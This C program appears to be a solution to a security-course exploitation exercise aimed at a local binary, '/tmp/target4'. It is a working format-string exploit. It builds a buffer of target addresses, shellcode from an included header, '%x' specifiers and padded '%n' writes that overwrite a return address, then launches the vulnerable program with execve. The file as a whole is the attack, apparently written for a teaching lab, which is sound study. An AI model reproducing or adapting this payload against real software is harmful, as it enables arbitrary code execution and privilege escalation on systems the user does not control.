#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target4"

int main(void) {
  char *args[3];
  char *env[1];

  char buf[481] = "\x9c\xfc\xff\xbf"
                  "\x9d\xfc\xff\xbf"
                  "\x9e\xfc\xff\xbf"
                  "\x9f\xfc\xff\xbf";

  strcpy(buf + strlen(buf), shellcode);

  strcpy(buf + strlen(buf), "%x%x%x");

  // expected 0xbffffac8

  memset(buf + strlen(buf), 'A', 136);
  strcpy(buf + strlen(buf), "%n");

  memset(buf + strlen(buf), 'A', 0xfa - 0xc8);
  strcpy(buf + strlen(buf), "%n");

  memset(buf + strlen(buf), 'A', 0xff - 0xfa);
  strcpy(buf + strlen(buf), "%n");

  memset(buf + strlen(buf), 'A', 0x1bf - 0xff);
  strcpy(buf + strlen(buf), "%n");

  memset(buf + strlen(buf), 'A', sizeof(buf) - strlen(buf));

  buf[480] = 0;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
